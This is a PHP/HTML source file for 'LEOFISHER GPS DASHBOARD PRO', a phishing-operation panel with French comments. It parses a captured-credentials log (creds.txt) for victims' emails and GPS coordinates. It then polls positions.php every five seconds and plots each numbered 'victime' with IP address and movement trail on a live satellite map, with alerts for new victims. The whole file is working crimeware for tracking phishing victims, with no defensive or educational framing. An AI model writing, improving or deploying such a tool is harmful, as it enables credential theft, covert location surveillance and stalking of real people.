<?php
// TON CODE PHP ORIGINAL 100% INTACT
date_default_timezone_set('Africa/Bujumbura');
$creds_file = 'creds.txt';
$victims = [];

// Parseur PRO ORIGINAL PRESERVE
if (file_exists($creds_file)) {
    $logs = file_get_contents($creds_file);
    $entries = explode("┌─[ LEOFISHER v1.0 by Léo Falcon ]", $logs);

    foreach ($entries as $entry) {
        if (preg_match('/📍 GPS POSITION : ([-+]?\d+\.\d+),([-+]?\d+\.\d+)/', $entry, $gps_match)) {
            if (preg_match('/📧 .*? : (.*?)\n/', $entry, $email_match)) {
                $email = trim($email_match[1]);
                $lat = floatval($gps_match[1]);
                $lng = floatval($gps_match[2]);
                if ($lat != 0 && $lng != 0 && abs($lat) < 90 && abs($lng) < 180) {
                    $victims[] = [
                        'lat' => $lat,
                        'lng' => $lng,
                        'email' => $email,
                        'ip' => '',
                        'time' => date('H:i:s')
                    ];
                }
            }
        }
    }
}

$op_lat = -3.361378;
$op_lng = 29.359912;
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>LEOFISHER GPS DASHBOARD PRO 2025 - LIVE TRACKING</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <link rel="stylesheet" href="https://unpkg.com/leaflet.markercluster@1.4.1/dist/MarkerCluster.css" />
    <link rel="stylesheet" href="https://unpkg.com/leaflet.markercluster@1.4.1/dist/MarkerCluster.Default.css" />
    <style>
        /* TON CSS ORIGINAL + UPGRADES */
        body { margin: 0; font-family: 'Courier New', monospace; background: #0a0a0a; color: #00ff00; }
        #map { height: 100vh; width: 100%; }
        .dashboard { position: absolute; top: 10px; left: 10px; background: rgba(0,0,0,0.95); padding: 20px; border: 2px solid #00ff00; border-radius: 8px; z-index: 1000; }
        .stats { font-size: 14px; margin: 6px 0; }
        .victim-count { color: #ff0000; font-weight: bold; font-size: 18px; }
        .live-indicator { color: #00ff00; animation: blink 1s infinite; }
        @keyframes blink { 50% { opacity: 0.3; } }
        .zoom-controls { position: absolute; top: 10px; right: 10px; background: rgba(0,0,0,0.9); padding: 10px; border: 2px solid #00ff00; border-radius: 5px; z-index: 1000; }
        .zoom-btn { background: #00ff00; color: #000; border: none; padding: 8px 12px; margin: 2px; cursor: pointer; font-weight: bold; border-radius: 3px; }
        .zoom-btn:hover { background: #00cc00; }
        .op-marker { font-size: 24px; color: #ffff00 !important; animation: opPulse 2s infinite; }
        .victim-marker { animation: pulse 2s infinite; }
        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.4; } 100% { opacity: 1; } }
        @keyframes opPulse { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
        .trajectory { stroke-dasharray: 8,8; stroke-width: 4 !important; }
        .alert-popup { background: #ff4444; color: white; padding: 20px; border-radius: 10px; font-weight: bold; animation: shake 0.6s; }
        @keyframes shake { 0%,100%{transform:translateX(0);}25%{transform:translateX(-10px);}75%{transform:translateX(10px);}}
    </style>
</head>
<body>
    <div id="map"></div>
    <div class="dashboard">
        <div class="stats"><strong>🚨 LEOFISHER GPS PRO 2025 - LIVE TRACKING</strong></div>
        <div class="stats victim-count">🎯 Victimes Live: <span id="victimCount">0</span></div>
        <div class="stats">📍 Opérateur Mobile: <span id="opCoords"><?php echo $op_lat . ', ' . $op_lng; ?></span> <span class="live-indicator">●</span></div>
        <div class="stats">🛰️ Esri HD 2025 Zoom 22 + Trajectoires Live</div>
        <div class="stats">🔄 Update: 5s | <span id="liveCounter">0</span></div>
    </div>
    <div class="zoom-controls">
        <button class="zoom-btn" onclick="map.setZoom(map.getZoom() + 1)">🔍 +</button>
        <button class="zoom-btn" onclick="map.setZoom(map.getZoom() - 1)">🔎 -</button>
        <button class="zoom-btn" onclick="fitAllBounds()">📐 Fit All</button>
    </div>

    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <script src="https://unpkg.com/leaflet.markercluster@1.4.1/dist/leaflet.markercluster.js"></script>
    <script>
        // LIVE TRACKING ENGINE PRO
        let map, clusterGroup = L.markerClusterGroup({spiderfyOnMaxZoom:true,showCoverageOnHover:true}), 
            bounds = L.latLngBounds(), opMarker, victims={}, trajets={}, liveCount=0,
            audio = new Audio('data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFbF1fdJivrJBhNjVgodDbq2EcBj+a2/LDciUFLIHO8tiJNwgZaLvt559NEAxQp+PwtmMcBjiR1/LMeSwFJHfH8N2QQAo');
        
        const victimsData = <?php echo json_encode($victims); ?>;
        
        // CARTE ESRI HD (ton code exact)
        const satellite = L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}', {
            attribution: '© Esri WorldImagery 2025 HD', maxZoom: 22, minZoom: 1
        });
        const roads = L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {attribution: '© OpenStreetMap', opacity: 0.7, maxZoom: 22});
        
        map = L.map('map', {layers: [satellite, roads], zoomControl: false, maxZoom: 22}).setView([<?php echo $op_lat; ?>, <?php echo $op_lng; ?>], 12);
        map.addLayer(clusterGroup);

        // OP MOBILE LIVE (watchPosition + interpolation fluide)
        let opWatchId = navigator.geolocation.watchPosition(pos => {
            const lat = pos.coords.latitude, lng = pos.coords.longitude;
            document.getElementById('opCoords').textContent = `${lat.toFixed(5)}, ${lng.toFixed(5)}`;
            
            if (opMarker) {
                // FLUIDE : slide vers nouvelle position
                opMarker.setLatLng([lat, lng], {duration: 1000});
            } else {
                opMarker = L.marker([lat, lng], {
                    icon: L.divIcon({className: 'op-marker', html: '🟡 <strong>OP</strong>', iconSize: [36, 36]})
                }).addTo(map).bindPopup(`<b>🚨 OPÉRATEUR MOBILE LIVE</b><br>GPS: ${lat.toFixed(6)}, ${lng.toFixed(6)}`);
            }
            bounds.extend([lat, lng]);
        }, err => {
            // Fallback Bujumbura
            const fallback = {coords: {latitude: <?php echo $op_lat; ?>, longitude: <?php echo $op_lng; ?>}};
            document.getElementById('opCoords').textContent = '<?php echo $op_lat . ', ' . $op_lng; ?>';
        }, {enableHighAccuracy: true, timeout: 2000, maximumAge: 1000});

        // Haversine distance trajet
        function haversineDistance(pos1, pos2) {
            const R = 6371, dLat = (pos2[0] - pos1[0]) * Math.PI / 180, dLon = (pos2[1] - pos1[1]) * Math.PI / 180;
            const a = Math.sin(dLat/2) * Math.sin(dLat/2) + Math.cos(pos1[0] * Math.PI / 180) * Math.cos(pos2[0] * Math.PI / 180) * Math.sin(dLon/2) * Math.sin(dLon/2);
            return R * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
        }

        // LIVE UPDATE VICTIMES + TRAJECTOIRES
        async function liveTrackingUpdate() {
            try {
                const response = await fetch('positions.php');
                const liveVictims = await response.json();
                
                liveVictims.forEach(victim => {
                    const id = victim.id, positions = victim.positions, latest = victim.latest;
                    
                    // NOUVELLE VICTIME → ALERTE
                    if (!victims[id]) {
                        const victimNum = ++liveCount;
                        document.getElementById('victimCount').textContent = liveCount;
                        
                        // MARKER ROUGE NUMÉROTÉ
                        const marker = L.marker([latest[0], latest[1]], {
                            icon: L.divIcon({
                                className: 'victim-marker', 
                                html: `🔴 #${victimNum}`,
                                iconSize: [28, 28]
                            })
                        }).addTo(clusterGroup);
                        
                        // TRAJECTOIRE LIVE (polyline rouge)
                        const trajectory = L.polyline(positions.map(p => [p[0], p[1]]), {
                            color: '#ff4444', weight: 4, opacity: 0.9, 
                            className: 'trajectory',
                            smoothFactor: 1
                        }).addTo(map);
                        
                        // POPUP COMPLÈTE TRAJET
                        const totalDist = positions.reduce((sum, pos, i) => i > 0 ? sum + haversineDistance(positions[i-1], pos) : sum, 0).toFixed(1);
                        marker.bindPopup(`
                            <div style="font-family:monospace;color:#ff4444;width:300px;">
                                <h3>🎯 VICTIME #${victimNum}: ${id}</h3>
                                <strong>📍 Live GPS:</strong> ${latest[0].toFixed(6)}, ${latest[1].toFixed(6)}<br>
                                <strong>🛤️ Trajectoire:</strong> ${positions.length} points | <strong>${totalDist}km</strong><br>
                                <strong>🌐 IP:</strong> ${victim.ip}<br>
                                <strong>🕒 Update:</strong> ${latest[2]}
                            </div>
                        `);
                        
                        victims[id] = { marker, trajectory, positions };
                        showAlert(`🎯 NOUVELLE VICTIME #${victimNum}: ${id}`);
                        audio.play().catch(()=>{}); // Beep
                    } else {
                        // UPDATE LIVE EXISTANT
                        victims[id].marker.setLatLng([latest[0], latest[1]]);
                        victims[id].trajectory.setLatLngs(positions.map(p => [p[0], p[1]]));
                        victims[id].positions = positions;
                        bounds.extend(latest);
                    }
                });
                
                document.getElementById('liveCounter').textContent = liveCount;
                if (Object.keys(victims).length > 0) fitAllBounds();
                
            } catch(e) { console.error('Live update:', e); }
        }

        function showAlert(msg) {
            L.popup({closeButton: false}).setLatLng([<?php echo $op_lat; ?>, <?php echo $op_lng; ?>])
                .setContent(`<div class="alert-popup">${msg}</div>`).openOn(map);
        }

        function fitAllBounds() {
            if (bounds.isValid()) map.fitBounds(bounds, {padding: [50, 50], maxZoom: 18});
        }

        // LOAD INITIAL + LIVE ENGINE (remplace location.reload())
        victimsData.forEach((v, i) => {
            bounds.extend([v.lat, v.lng]);
            document.getElementById('victimCount').textContent = victimsData.length;
        });
        
        // LIVE TRACKING 5s SANS RELOAD
        setInterval(liveTrackingUpdate, 5000);
        liveTrackingUpdate(); // Start immédiat
    </script>
</body>
</html>

